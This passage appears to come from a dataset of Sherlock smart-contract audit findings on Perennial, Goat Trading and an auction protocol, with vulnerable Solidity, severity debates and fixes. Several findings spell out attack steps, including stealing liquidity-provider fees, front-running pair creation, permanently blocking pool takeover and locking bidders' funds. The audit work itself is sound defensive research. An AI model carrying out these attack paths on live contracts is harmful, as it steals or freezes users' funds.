abi.decode(payloads[i], (bytes32[3], bytes));\n            (Asset memory fee, ,) = feeManager.getFeeAndReward(address(this), report, feeTokenAddress);\n            totalFeeAmount // Add the line below\n= fee.amount;\n        }\n// Remove the line below\n       return totalFeeAmount;\n// Add the line below\n       return totalFeeAmount * numRequested / payloads.length ;\n    }\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\npanprog commented:\nvalid medium, the attacker will have to commit requested along with unrequested which might not be easy to do due to competition\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/293чIf `non-requested versions` will pay as well, it is easy to maliciously submit `non-requested` maliciously consume `ChainlinkFactory` fees balance (Note that needs at least one numRequested to call `_handleKeeperFee()` )\nCode Snippet\nTool used\nManual Review
Liquidity provider fees can be stolen from any pairчhighч```\nif (to != address(this)) {\n    _updateFeeRewards(to);\n}\n```\nчAn attacker can steal the liquidiy providers fees by transfering liquidity tokens to the pair and then withdrawing fees on behalf of the pair itself.\nThis is possible because of two reasons:\nTransfering liquidity tokens to the pair itself doesn't update the fee tracking variables:\n```\nif (to != address(this)) {\n    _updateFeeRewards(to);\n}\n```\n\nwhich results in the variable `feesPerTokenPaid[address(pair)]` of the pair being equal to 0.\nThe function withdrawFees() is a permissionless function that allows to withdraw fees on behalf of any address, including the pair itself.\nBy combining this two quirks of the codebase an attacker can steal all of the currently pending liquidity provider fees by doing the following:\nAdd liquidity to a pair, which will mint the attacker some liquidity tokens\nTransfer the liquidity tokens to the pair directly\nCall withdrawFees() by passing the address of the pair. Because `feesPerTokenPaid[address(pair)]` is 0 this will collect fees on behalf of the pair even if it shouldn't. The function will transfer an amount `x` of WETH from the pair to the pair itself and will lower the `_pendingLiquidityFee` variable by that same amount\nBecause the variable `_pendingLiquidityFee` has been lowered by `x` the pool will assume someone transferred `x` WETH to it\nAt this point the attacker can take advantage of this however he likes, but for the sake of the example let's suppose he calls swap() to swap `x` ETH into tokens that will be transferred to his wallet\nThe attacker burns the liquidity transferred at point `2` to recover his funds\nPOC\nч"
Some unusual problems arise in the use of the `GoatV1Factory.sol#createPair()` function.чmediumч```\n    function _addLiquidity(\n        address token,\n        uint256 tokenDesired,\n        uint256 wethDesired,\n        uint256 tokenMin,\n        uint256 wethMin,\n        GoatTypes.InitParams memory initParams\n    ) internal returns (uint256, uint256, bool) {\n        GoatTypes.LocalVariables_AddLiquidity memory vars;\n        GoatV1Pair pair = GoatV1Pair(GoatV1Factory(FACTORY).getPool(token));\n        if (address(pair) == address(0)) {\n            // First time liquidity provider\n            pair = GoatV1Pair(GoatV1Factory(FACTORY).createPair(token, initParams));\n            vars.isNewPair = true;\n        }\n\n        if (vars.isNewPair) {\n// rest of codeSNIP\n        } else {\n            /**\n             * @dev This block is accessed after the presale period is over and the pool is converted to AMM\n             */\n       (uint256 wethReserve, uint256 tokenReserve) = pair.getReserves();\n       uint256 tokenAmountOptimal = GoatLibrary.quote(wethDesired, wethReserve, tokenReserve);\n       if (tokenAmountOptimal <= tokenDesired) {\n           if (tokenAmountOptimal < tokenMin) {\n               revert GoatErrors.InsufficientTokenAmount();\n           }\n           (vars.tokenAmount, vars.wethAmount) = (tokenAmountOptimal, wethDesired);\n       } else {\n           uint256 wethAmountOptimal = GoatLibrary.quote(tokenDesired, tokenReserve, wethReserve);\n           assert(wethAmountOptimal <= wethDesired);\n           if (wethAmountOptimal < wethMin) revert GoatErrors.InsufficientWethAmount();\n           (vars.tokenAmount, vars.wethAmount) = (tokenDesired, wethAmountOptimal);\n       }\n   }\n   return (vars.tokenAmount, vars.wethAmount, vars.isNewPair);\n    }\n```\nч```\n    function _addLiquidity(\n        address token,\n        uint256 tokenDesired,\n        uint256 wethDesired,\n        uint256 tokenMin,\n        uint256 wethMin,\n        GoatTypes.InitParams memory initParams\n    ) internal returns (uint256, uint256, bool) {\n        GoatTypes.LocalVariables_AddLiquidity memory vars;\n        GoatV1Pair pair = GoatV1Pair(GoatV1Factory(FACTORY).getPool(token));\n        if (address(pair) == address(0)) {\n            // First time liquidity provider\n            pair = GoatV1Pair(GoatV1Factory(FACTORY).createPair(token, initParams));\n            vars.isNewPair = true;\n        }\n\n        if (vars.isNewPair) {\n// rest of codeSNIP\n        } else {\n            /**\n             * @dev This block is accessed after the presale period is over and the pool is converted to AMM\n             */\n       (uint256 wethReserve, uint256 tokenReserve) = pair.getReserves();\n       uint256 tokenAmountOptimal = GoatLibrary.quote(wethDesired, wethReserve, tokenReserve);\n       if (tokenAmountOptimal <= tokenDesired) {\n           if (tokenAmountOptimal < tokenMin) {\n               revert GoatErrors.InsufficientTokenAmount();\n           }\n           (vars.tokenAmount, vars.wethAmount) = (tokenAmountOptimal, wethDesired);\n       } else {\n           uint256 wethAmountOptimal = GoatLibrary.quote(tokenDesired, tokenReserve, wethReserve);\n           assert(wethAmountOptimal <= wethDesired);\n           if (wethAmountOptimal < wethMin) revert GoatErrors.InsufficientWethAmount();\n           (vars.tokenAmount, vars.wethAmount) = (tokenDesired, wethAmountOptimal);\n       }\n   }\n   return (vars.tokenAmount, vars.wethAmount, vars.isNewPair);\n    }\n```\n\nFor simplicity, let’s only consider from #L250 to #L256.\nL250:wethReserve = virtualEth, tokenReserve = initialTokenMatch - (initialTokenMatch - ((virtualEth * initialTokenMatch)/(virtualEth + bootstrapEth)) + + (virtualEthinitialTokenMatchbootstrapEth)/(virtualEth + bootstrapEth) ^ 2) = = ((virtualEth * initialTokenMatch)/(virtualEth + bootstrapEth)) - (virtualEthinitialTokenMatchbootstrapEth)/(virtualEth + bootstrapEth) ^ 2 L251:tokenAmountOptimal = wethDesired * wethReserve / tokenReserve vars.tokenAmount = tokenAmountOptimal vars.wethAmount = wethDesired\n```\n    function addLiquidity(\n        address token,\n        uint256 tokenDesired,\n        uint256 wethDesired,\n        uint256 tokenMin,\n        uint256 wethMin,\n        address to,\n        uint256 deadline,\n        GoatTypes.InitParams memory initParams\n    ) external nonReentrant ensure(deadline) returns (uint256, uint256, uint256) {\n// rest of codeSNIP\n    IERC20(vars.token).safeTransferFrom(msg.sender, vars.pair, vars.actualTokenAmount);\n    if (vars.wethAmount != 0) {\n        IERC20(WETH).safeTransferFrom(msg.sender, vars.pair, vars.wethAmount);\n    }\n    vars.liquidity = GoatV1Pair(vars.pair).mint(to);\n// rest of codeSNIP\n    }\n```\n\nNext, the `GoatV1Pair(vars.pair).mint()` function checks the validity of the transmitted token.\n```\n    function mint(address to) external nonReentrant returns (uint256 liquidity) {\n    // rest of codeSNIP\n        if (_vestingUntil == _MAX_UINT32) {\n            // Do not allow to add liquidity in presale period\n            if (totalSupply_ > 0) revert GoatErrors.PresalePeriod();\n            // don't allow to send more eth than bootstrap eth\n            if (balanceEth > mintVars.bootstrapEth) {\n                revert GoatErrors.SupplyMoreThanBootstrapEth();\n            }\n\n            if (balanceEth < mintVars.bootstrapEth) {\n                (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = _tokenAmountsForLiquidityBootstrap(\n                    mintVars.virtualEth, mintVars.bootstrapEth, balanceEth, mintVars.initialTokenMatch\n                );\n           if (balanceToken != (tokenAmtForPresale + tokenAmtForAmm)) {\n                    revert GoatErrors.InsufficientTokenAmount();\n                }\n                liquidity =\n                    Math.sqrt(uint256(mintVars.virtualEth) * uint256(mintVars.initialTokenMatch)) - MINIMUM_LIQUIDITY;\n            } else {\n                // This means that user is willing to make this pool an amm pool in first liquidity mint\n           liquidity = Math.sqrt(balanceEth * balanceToken) - MINIMUM_LIQUIDITY;\n           uint32 timestamp = uint32(block.timestamp);\n           _vestingUntil = timestamp + VESTING_PERIOD;\n            }\n            mintVars.isFirstMint = true;\n        }\n    // rest of codeSNIP\n    }\n```\n\nIn here, `balanceToken = vars.tokenAmount (value:tokenAmountOptimal)` and `tokenAmtForPresale + tokenAmtForAmm` is calculated follows.\ntokenAmtForPresale = initialTokenMatch - (virtualEth * initialTokenMatch / (virtualEth + bootstrapEth)) - - (balanceEth(value:wethDesired)*initialTokenMatch/(virtualEth+balanceEth)) tokenAmtForAmm = (virtualEth * initialTokenMatch * bootstrapEth) / (virtualEth + bootstrapEth) ^ 2\nBased on this fact, an attacker can front run the `createPair()` function if he finds the `addLiquidity()` function in the mempool.чDiscussion\nkennedy1030\nFastTiger777\nkennedy1030\nzzykxx\nEscalate\nOut of scope. It's known that attackers can frontrun a pair creation, this is why the function `takeOverPool()` exists in the first place.\nsherlock-admin2\nEscalate\nOut of scope. It's known that attackers can frontrun a pair creation, this is why the function `takeOverPool()` exists in the first place.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nFastTiger777\nHowever, the takeOverPool() function is not enough to completely prevent the attacker's preemption attack, and the loss of initial LP due to the attack still exists. As @zzykxx said, if the takeOverPool() function is to prevent an attacker's attack, the attacker's attack cannot be prevented unless the takeOverPool() function is always called within the same transaction.\nFastTiger777\nAdditionally, even if a user takes over a pool using takeOverPool(), there will still be the loss of fund of the initial LP due to #L139.\ncvetanovv\nI disagree with the escalation. Nowhere do I see front-run a pair creation as a known issue. But even if we assume that `takeOverPool()` is for this then Watson has shown a valid attack vector.\nF01ivor4\nI think this is not high.\nFastTiger777\nIn this case, I think it should be considered high because the initial LP must pay an amount of ETH equivalent to bootstrap ETH when adding liquidity, which damages the bootstrap function of the protocol and causes a loss of funds for the initial LP.\nEvert0x\nIt's known that attackers can frontrun a pair creation\nI don't see this mentioned as a known issue. That's why I believe the escalation should be rejected and the issue should stay as is.\nzzykxx\nMaybe I'm missing something? The function `takeOverPool()` exists for the exact purpose of taking back control of pools that an attacker created before a team, here's the comment. Given the devs implemented the `takeOverPool()` function for this reason, how is this not a known issue?\nFastTiger777\nWhat I mean is that although takeOverPool() is used to restore the pool, the main point is that the initial liquidity provider loses funds and destroys the bootstrap function of the protocol. Therefore I think this issue is valid.\nkennedy1030\nI believe this issue should be considered a user mistake. If a user creates a pair with the `GoatRouterV1`, no action will occur. Front running could only occur when a user attempts to create a pair without a router. Since most users will use the `GoatRouterV1` to create pairs, I consider this to be a user mistake and classify it as a medium-security issue at most.\nFastTiger777\nI think front running is not the mistake of the user and it is intentional attack of the attacker. The attacker create the pool intentionally before addLiquiditi() function is called. At this time, the user calls takeOverPool() to take over the pool, but user pay an amount of ETH equivalent to bootstrap ETH to provide liquidities. This is a clear destruction of the protocol's bootstrap functionality.\nkennedy1030\nFastTiger777\n@zzykxx , could you please look at the comment of the takeOverPool()? takeOverPool() is used to take over the pool when the malicious actors set the unfavoral initial conditions. So the action of users that create the pool by using router is also involved in here. So I think this is not known issue.\nFastTiger777\nHi @kennedy1030 , the attacker creates the pool before the user calls addLiquidity() function of Router. So the front running attack is existed surely. Refer this.\nBased on this fact, an attacker can front run the createPair() function if he finds the addLiquidity() function in the mempool.\nkennedy1030\nI cannot understand why this issue could be a valid high severity. I think that the impact is not high severity. It cannot lead to loss of funds.\nFastTiger777\nIn my report, I clearly stated the attacker's front running attack.\nFastTiger777\nI cannot understand why this issue could be a valid high severity. I think that the impact is not high severity. It cannot lead to loss of funds.\nBecause the initial LP losses the fund. The point of the bootstrap feature is that LPs can provide liquidity even without a sufficient amount of ETH. However, due to the attack, the initial LP must pay an amount of ETH equivalent to the bootstrap ETH, so this is an obvious loss of funds.\nkennedy1030\nFastTiger777\nThis is the purpose of the takeOverPool() function that @zzykxx mentions. Setting the four parameters to 0 should be considered a malicious action by the user thoroughly. This is because it may result in protocol interruption due to potential DOS.\nkennedy1030\n```\nfunction addLiquidityParams(bool initial, bool sendInitWeth) public returns (AddLiquidityParams memory) {\n        weth.deposit{value: 100e18}();\n        if (initial) {\n            /* ------------------------------- SET PARAMS ------------------------------- */\n            addLiqParams.token = address(token);\n            addLiqParams.tokenDesired = 0;\n            addLiqParams.wethDesired = 0;\n            addLiqParams.tokenMin = 0;\n            addLiqParams.wethMin = 0;\n            addLiqParams.to = address(this);\n            addLiqParams.deadline = block.timestamp + 1000;\n\n            addLiqParams.initParams = GoatTypes.InitParams(10e18, 10e18, sendInitWeth ? 5e18 : 0, 1000e18);\n        } else {\n            addLiqParams.token = address(token);\n            addLiqParams.tokenDesired = 100e18;\n            addLiqParams.wethDesired = 1e18;\n            addLiqParams.tokenMin = 0;\n            addLiqParams.wethMin = 0;\n            addLiqParams.to = address(this);\n            addLiqParams.deadline = block.timestamp + 1000;\n\n            addLiqParams.initParams = GoatTypes.InitParams(0, 0, 0, 0);\n        }\n        return addLiqParams;\n    }\n```\n\nFastTiger777\nI mean the from 2nd to 5th parameters of addLiquidity(). That is, `tokenDesired`, `wethDesired`, tokenMin,wethMin. Setting them to 0s is not a malicious action. It is a normal action for the initial LP. Because they have no meaning for the initial LP.\nIn getReserve() function, DOS occurs due to division by 0. Please take a look again.\nkennedy1030\nIt means that loss of funds for initial LP is impossible. I think that this kind of DOS could be only seen as a medium severity at most.\nFastTiger777\nWhen totalSupply=0, the liquidity provider can be the initial LP. Therefore, there is still a loss of user funds.\nkennedy1030\nCould you provide the valid POC? I do not believe that this attack could lead to loss of fund. And I think that the effective `takeOver` could take over the pools created by the malicious action like that,\nFastTiger777\nCould you provide the valid POC? I do not believe that this attack could lead to loss of fund. And I think that the effective `takeOver` could take over the pools created by the malicious action like that,\nWhat do you mean by effective `takeOver`, how do you set the 4 parameters? Can you explain about that?\nkennedy1030\nYou should provide the valid POC that shows loss of fund. If not, your issue can only be seen as a DOS. `takeOver` is another problem. I think that `takeOverPool()` should be made to take over the pools created by any malicious users.\nFastTiger777\nwhen the user takes over the pool, how to set initial parameters?\nkennedy1030\nDo you agree that the front running attack cannot lead to loss of funds without any user mistake?\nFastTiger777\nNo, As mentioned before, due to a front running attack, LP must pay an amount of ETH equivalent to bootstrapETH. Although the protocol states that LPs can create a pool without a sufficient amount of ETH, due to the attack, LPs must pay a corresponding amount of ETH, so this should clearly be seen as a loss of funds. And then, the front running attack is not the mistake of the user. You cannot correlate front running attacks with user error. I think you are thinking wrong.\nkennedy1030\nBut I could not agree that this could be seen as a loss of funds. It can only be seen as a DOS. How can it be seen as loss of fund if a user can know the result before calling? So, the impact is only DOS, not loss of fund. Who would call a function when he already knows that it could lead to his loss of fund? Also, setting parameters to 0s can prevent the front running. So, I think that this front running is no any meaning. I believe that judges will make correct decision.\nFastTiger777\nAs a result, LPs cannot add liquidity, The bootstrap function of the protocol is destroyed and serious losses are incurred. I also believe that the judges will make the right decision.\nkennedy1030\nI think that you`d better provide a valid POC that show the loss of funds.\nFastTiger777\nThe sponsors also acknowledged that the bootstrap function be broken. Let's wait for the judges' decision.\nEvert0x\nResult: High Unique\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nzzykxx: rejected\nFastTiger777\n@Evert0x , @cvetanovv , thank you for your work. I would also like to thank @zzykxx and @kennedy1030 for kindly reviewing my issue.\nzzykxx\n@Evert0x can you please explain your decision on why this is high severity and why is it not known? Even if this is considered valid, which I still don't understand why it should be, how can it be high severity given there's no loss of funds?\nThere's a section about the `takeOverPool()` function and why it exists in the docs as well.\nFastTiger777\nThis is because the bootstrap function, a core function of the protocol, is destroyed.\nzzykxx\nThis is because the bootstrap function, a core function of the protocol, is destroyed.\nFrom the docs about takeOverPool():\nThis function exists to avoid griefing. Because only one pool can be created for each token (since we only allow a token to be matched with Weth for simplicity’s sake), and that one pool has settings that could affect its performance, there are possible scenarios where a griefer starts a pool that has bad settings to block someone from creating a useful pool. The griefer could, for example, set the pool so that 1 token is worth 100 virtual Ether and they want to raise 100 Ether. No one would buy the token at this price, and the pool would never be able to turn into an unrestricted AMM.\nEvert0x\nIt's not a known issue because it isn't listed in the known issues section of the README.\nHowever, I believe it should actually be Medium instead of High. As the following language fits the impact the best.\nV. How to identify a medium issue: Breaks core contract functionality, rendering the contract useless or leading to loss of funds.\nFastTiger777\nAs mentioned before, the bootstrap function, a core function of the protocol, is destroyed. Therefore the initial LP has to pay an amount of ETH equivalent to bootstrapETH. As a result, this leads the loss of fund of the initial LP, so I think this is considerred to high. @Evert0x , @cvetanovv , could you please check this issue again?\nFastTiger777\nI think it is high issue: I think this is more suitable.\nIn sherlock docs IV. How to identify a high issue: Definite loss of funds without (extensive) limitations of external conditions.\n@Evert0x , @cvetanovv , could you please check this issue again?\nFastTiger777\nDue to the bootstrap function, LPs can provide liquidity even without a sufficient amount of ETH. However, because this feature is destroyed, the initial LP has to pay more funds. This results in a loss of funds for the initial LP. Therefore, I believe that this issue should be considered high.\nadamidarrha\n@Evert0x @FastTiger777 @zzykxx @kennedy1030, I recommend making this issue a low severity one.\nThe discussion has been quite scattered, so let's focus on the main points:\nMain Issue in Report: Watson highlighted that the `addLiquidity` function in the router reverts if initialETH is not specified as bootstrapETH. This is the only issue clearly identified in his report. and also he brushed up on frontrunning this transaction which could be done with this issue or not. Everything else was brought up in subsequent discussions.\nFrontrunning Concern: The discussion touched on the potential for someone to frontrun a deployer of a pair by creating it themselves. However, this is a well-known scenario within the protocol. The explicit purpose of the takeOverPool function, as zzykxx pointed out, addresses this. This is not a new issue and similar issues have been raised in this contest and were invalidated. Therefore, to be impartial any discussions about frontrunning should not impact the validity of the current issue.\nRecommendation: The recommendation by Watson states that createPair should only be called from the router, which wont solve the first issue, and it wont solve frontrunning , because anybody can call `GoatV1Router:addLiquidity` which calls createPair.\nGiven these clarifications, there is no significant impact for the issue presented by the current report, especially considering the known frontrunning strategy handled by takeOverPool. Thus, this issue should be low/informational.\nFastTiger777\nHi, @adamidarrha , It seems that the discussion on the issue is quite off.\nMain Issue in Report: Watson highlighted that the addLiquidity function in the router reverts if initialETH is not specified as bootstrapETH. This is the only issue clearly identified in his report. and also he brushed up on frontrunning this transaction which could be done with this issue or not. Everything else was brought up in subsequent discussions.\nThe first problem you mentioned is not the basic point of the problem I raised. Also the reason the addLiquidity() function is returned is directly related to the front running attack using createPair(), and as emphasized several times before, the pool argument using takeOverPool() cannot prevent DOS that occurs in the addLiquidity() function. Additionally, the problem of designating the initial ETH as bootstrapETH that you mentioned is a feature that the protocol team is specifically trying to implement, unlike other DEXs (Uniswap, Shushiswap, etc), and is a core function of this protocol. In other words, this problem is valid because the core function of this protocol is damaged.\nadamidarrha\n@FastTiger777 , I understand the issue you highlighted in the report where `addLiquidity` fails if `initialETH` is less than `bootstrapETH`. because initialTokenMatch being sent to `GoatV1Pair` instead of `tokenAmtForPresale + tokenAmtForAmm`, which then causes the mint function in `GoatV1Pair` to revert. However, this does not constitute a denial of service (DOS) as it affects only that specific transaction. The deployer can resolve this by transferring the difference then calling mint so it matches the required sum, thereby allowing the transaction to succeed. this doesn't qualify for a DOS because of only reverting that transaction. If you believe that this warants a medium severity, could you please provide an attack path of how there can be a DOS.\nFastTiger777\nThe deployer can resolve this by transferring the difference then calling mint so it matches the required sum, thereby allowing the transaction to succeed. this doesn't qualify for a DOS because of only reverting that transaction. If you believe that this warants a medium severity, could you please provide an attack path of how there can be a DOS.\nAs you mentioned, for the transaction to succeed, the LP must transfer an amount of ETH equivalent to bootstraETH. This is the basic point of what you mentioned. However, the reason I emphasize this problem is that sending the required amount of ETH destroys the bootstrap function, which is the core function of this protocol. Please check the DOC and entire code base again.\nDOC:\nFor teams: When creating our MVP, inedibleX, we faced problems with teams not being able to create multiple pools because of a lack of Ether to match their tokens for a new pool, and new tokens being immediately sniped and dumped when they had inadequate liquidity, leading to a crash in the charts and death of the token. The solution for both of these problems was the same: allow a pool to be created without any matching Ether liquidity, and use natural market movements of the token to generate the Ether required for a traditional liquidity pool. This creates a product that allows a sale to generate funds for the pool to occur while users enjoy trading as they would on any other token. Teams can now, whether creating their very first token pool or adding to one of their many on different chains, launch a pool with 0 Ether while providing the same experience to which users are accustomed.\nadamidarrha\n@FastTiger777, there's no need to transfer bootstrapETH. if you don't give bootstrapETH then `GoatV1Router:addLiquidity` call will revert. However, the deployer can directly call `GoatV1Pair:mint` with the correct amount of tokens to ensure success, as previously mentioned.\n@Evert0x, this issue describes a scenario where a transaction to `GoatV1Router:addLiquidity` reverts under specific conditions: namely, when a pool isn't deployed and the initial deployer opts to provide initialETH less than bootstrapETH. The router is merely a contract implementing safety checks, and a reverting transaction here does not signify a threat, as the user can simply execute `GoatV1Pair:mint` directly.\nAccording to Sherlock documentation, medium severity requires:\nConstrained loss of funds ❌\nBreak in core protocol functionality ❌\nthe issue doesn't result in a loss of funds, nor breaks any functionality so It has no real impact and should therefore be classified as low severity.\ni can provide POC if needed.\nFastTiger777\nCalling `GoatV1Pair:mint` directly is not a preferred manipulation of the protocol, but a kind of attack. Think about it carefully. If a pool does not initially exist, the protocol prefers to create a pool in addLiquidity().\nFastTiger777\n@Evert0x , as a result, I think it should be set high.\nadamidarrha\n@FastTiger777 the point is there is no impact of the issue that you stated. it can just be bypassed by directly calling mint, so it should be low unless you specify an attack path for it to warant a medium.\nFastTiger777\nIn the report, I clearly mentioned that the bootsrtap function of the protocol is damaged due to front running attacks, and I think this has already been discussed accurately previously. Discussions on this have already progressed sufficiently, so I believe the judges will make the right decision.\nadamidarrha\n@FastTiger777 we will let the judge decide, i can also provide a poc to show why it's low impact\nFastTiger777\nWhat is clear is that core functionality of the protocol is broken.\nAccording to Sherlock documentation, medium severity requires:\nConstrained loss of funds Break in core protocol functionality\nTherefore, this problem meets the above conditions.\nIn sherlock docs IV. How to identify a high issue: Definite loss of funds without (extensive) limitations of external conditions.\nAlso, when creating any pool, the core functionality of the protocol is damaged due to front running attacks, and as a result, initial LPs always pay more funds, so this is always a loss from the LP's perspective. Therefore, this issue meets the above high condition.чThe bootstrap function of the protocol is broken and the initial LP must pay an amount of WETH equivalent to bootstrapEth.\nCode Snippet\nTool used\nManual Review
The router is not compatible with fee on transfers tokensчmediumч```\naddress pair = GoatV1Factory(FACTORY).getPool(token);\n\nIERC20(pair).safeTransferFrom(msg.sender, pair, liquidity); //-> 1. Transfers liquidity tokens to the pair\n(amountWeth, amountToken) = GoatV1Pair(pair).burn(to); //-> 2. Burns the liquidity tokens and sends WETH and TOKEN to the recipient\nif (amountWeth < wethMin) { //-> 3. Ensures enough WETH has been transferred\n    revert GoatErrors.InsufficientWethAmount();\n}\nif (amountToken < tokenMin) { //4. Ensures enough TOKEN has been transferred\n    revert GoatErrors.InsufficientTokenAmount();\n}\n```\nчThe router is not compatible with fee on transfers tokens.\nLet's take as example the removeLiquidity function:\n```\naddress pair = GoatV1Factory(FACTORY).getPool(token);\n\nIERC20(pair).safeTransferFrom(msg.sender, pair, liquidity); //-> 1. Transfers liquidity tokens to the pair\n(amountWeth, amountToken) = GoatV1Pair(pair).burn(to); //-> 2. Burns the liquidity tokens and sends WETH and TOKEN to the recipient\nif (amountWeth < wethMin) { //-> 3. Ensures enough WETH has been transferred\n    revert GoatErrors.InsufficientWethAmount();\n}\nif (amountToken < tokenMin) { //4. Ensures enough TOKEN has been transferred\n    revert GoatErrors.InsufficientTokenAmount();\n}\n```\n\nIt does the following:\nTransfers liquidity tokens `to` the pair.\nBurns the liquidity tokens and sends WETH and TOKEN `to` the recipient `to`.\nEnsures enough WETH has been transferred.\nEnsures enough TOKEN has been transferred.\nAt point `4` the router doesn't account for the fee paid to transfer TOKEN. The recipient didn't actually receive `amountToken`, but slightly less because a fee has been charged.\nAnother interesting example is the removeLiquidityETH which first burns the liquidity and transfers the tokens to the router itself, and then from the router the tokens are transferred to the recipient. This will charge double the fees.\nThis is just two examples to highlight the fact that these kind of tokens are not supported, but the other functions in the router have similar issues that can cause all sorts of trouble including reverts and loss of funds.чAdd functionality to the router to support fee on transfer tokens, a good example of where this is correctly implememented is the Uniswap Router02.\nDiscussion\nsherlock-admin4\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nas per the readMe the contract should support FOT; medium(1)\nF01ivor4\nI think issue https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/40 is not same\nF01ivor4\nThe problem is on the router. And https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/40 is wrong.\nF01ivor4\nAlso, https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/3 is wrongчThe router is not compatible with fee on transfers tokens.\nCode Snippet\nTool used\nManual Review
It's possible to create pairs that cannot be taken overчmediumч```\nuint112 virtualEth = type(uint112).max;\nuint112 bootstrapEth = type(uint112).max;\nuint112 initialEth = type(uint112).max;\nuint112 initialTokenMatch = type(uint112).max;\n```\nчIt's possible to create pairs that cannot be taken over and DOS a pair forever.\nA pair is created by calling createPair() which takes the initial parameters of the pair as inputs but the initial parameters are never verified, which makes it possible for an attacker to create a token pair that's impossible to recover via takeOverPool().\nThere's more ways to create a pair that cannot be taken over, a simple example is to set all of the initial parameters to the maximum possible value:\n```\nuint112 virtualEth = type(uint112).max;\nuint112 bootstrapEth = type(uint112).max;\nuint112 initialEth = type(uint112).max;\nuint112 initialTokenMatch = type(uint112).max;\n```\n\nThis will make takeOverPool() revert for overflow on the internal call to _tokenAmountsForLiquidityBootstrap:\n```\nuint256 k = virtualEth * initialTokenMatch;\n tokenAmtForAmm = (k * bootstrapEth) / (totalEth * totalEth);\n```\n\nHere `virtualEth`, `initialTokenMatch` and `bootstrapEth` are all setted to `type(uint112).max`. The multiplication `virtualEth` * `initialTokenMatch` * `bootstrapEth` performed to calculate `tokenAmtForAmm` will revert for overflow because `2^112 * 2^112 * 2^112 = 2^336` which is bigger than `2^256`.чValidate a pair initial parameters and mint liquidity on pool creation.чCreation of new pairs can be DOSed forever.\nCode Snippet\nTool used\nManual Review
Module's gas yield can never be claimed and all yield will be lostчhighч```\n constructor(address auctionHouse_) LinearVesting(auctionHouse_) BlastGas(auctionHouse_) {}\n```\nчModule's gas yield can never be claimed\nThe protocol is meant to be deployed on blast, meaning that the gas and ether balance accrue yield.\nBy default these yield settings for both ETH and GAS yields are set to VOID as default, meaning that unless we configure the yield mode to claimable, we will be unable to recieve the yield. The protocol never sets gas to claimable for the modules, and the governor of the contract is the auction house, the auction house also does not implement any function to set the modules gas yield to claimable.\n```\n constructor(address auctionHouse_) LinearVesting(auctionHouse_) BlastGas(auctionHouse_) {}\n```\n\nThe constructor of both BlastLinearVesting and BlastEMPAM set the auction house here `BlastGas(auctionHouse_)` if we look at this contract we can observe the above.\n```\n    constructor(address parent_) {\n        // Configure governor to claim gas fees\n        IBlast(0x4300000000000000000000000000000000000002).configureGovernor(parent_);\n    }\n```\n\nAs we can see above, the governor is set in constructor, but we never set gas to claimable. Gas yield mode will be in its default mode which is VOID, the modules will not accue gas yields. Since these modules never set gas yield mode to claimable, the auction house cannot claim any gas yield for either of the contracts. Additionally the auction house includes no function to configure yield mode, the auction house contract only has a function to claim the gas yield but this will revert since the yield mode for these module contracts will be VOID.ч
Auction creators have the ability to lock bidders' funds.чhighч```\nfunction cancelAuction(uint96 lotId_) external override onlyInternal {\n    _revertIfLotConcluded(lotId_);\n}\n```\nч"`Auction creators` have the ability to cancel an `auction` before it starts. However, once the `auction` begins, they should not be allowed to cancel it. During the `auction`, `bidders` can place `bids` and send `quote` tokens to the `auction house`. After the `auction` concludes, `bidders` can either receive `base` tokens or retrieve their `quote` tokens. Unfortunately, batch `auction creators` can cancel an `auction` when it ends. This means that `auction creators` can cancel their `auctions` if they anticipate `losses`. This should not be allowed. The significant risk is that `bidders' funds` could become locked in the `auction house`.\n`Auction creators` can not cancel an `auction` once it concludes.\n```\nfunction cancelAuction(uint96 lotId_) external override onlyInternal {\n    _revertIfLotConcluded(lotId_);\n}\n```\n\nThey also can not cancel it while it is active.\n```\nfunction _cancelAuction(uint96 lotId_) internal override {\n    _revertIfLotActive(lotId_);\n\n    auctionData[lotId_].status = Auction.Status.Claimed;\n}\n```\n\nWhen the `block.timestamp` aligns with the `conclusion` time of the `auction`, we can bypass these checks.\n```\nfunction _revertIfLotConcluded(uint96 lotId_) internal view virtual {\n    if (lotData[lotId_].conclusion < uint48(block.timestamp)) {\n        revert Auction_MarketNotActive(lotId_);\n    }\n\n    if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);\n}\nfunction _revertIfLotActive(uint96 lotId_) internal view override {\n    if (\n        auctionData[lotId_].status == Auction.Status.Created\n            && lotData[lotId_].start <= block.timestamp\n            && lotData[lotId_].conclusion > block.timestamp\n    ) revert Auction_WrongState(lotId_);\n}\n```\n\nSo `Auction creators` can cancel an `auction` when it concludes. Then the `capacity` becomes `0` and the `auction status` transitions to `Claimed`.\n`Bidders` can not `refund` their `bids`.\n```\nfunction refundBid(\n    uint96 lotId_,\n    uint64 bidId_,\n    address caller_\n) external override onlyInternal returns (uint96 refund) {\n    _revertIfLotConcluded(lotId_);\n}\n function _revertIfLotConcluded(uint96 lotId_) internal view virtual {\n    if (lotData[lotId_].capacity == 0) revert Auction_MarketNotActive(lotId_);\n}\n```\n\nThe only way for `bidders` to reclaim their tokens is by calling the `claimBids` function. However, `bidders` can only claim `bids` when the `auction status` is `Settled`.\n```\nfunction claimBids(\n    uint96 lotId_,\n    uint64[] calldata bidIds_\n) {\n    _revertIfLotNotSettled(lotId_);\n}\n```\n\nTo `settle` the `auction`, the `auction status` should be `Decrypted`. This requires submitting the `private key`. The `auction creator` can not submit the `private key` or submit it without decrypting any `bids` by calling `submitPrivateKey(lotId, privateKey, 0)`. Then nobody can decrypt the `bids` using the `decryptAndSortBids` function which always reverts.\n```\nfunction decryptAndSortBids(uint96 lotId_, uint64 num_) external {\n    if (\n        auctionData[lotId_].status != Auction.Status.Created     // @audit, here\n            || auctionData[lotId_].privateKey == 0\n    ) {\n        revert Auction_WrongState(lotId_);\n    }\n\n    _decryptAndSortBids(lotId_, num_);\n}\n```\n\nAs a result, the `auction status` remains unchanged, preventing it from transitioning to 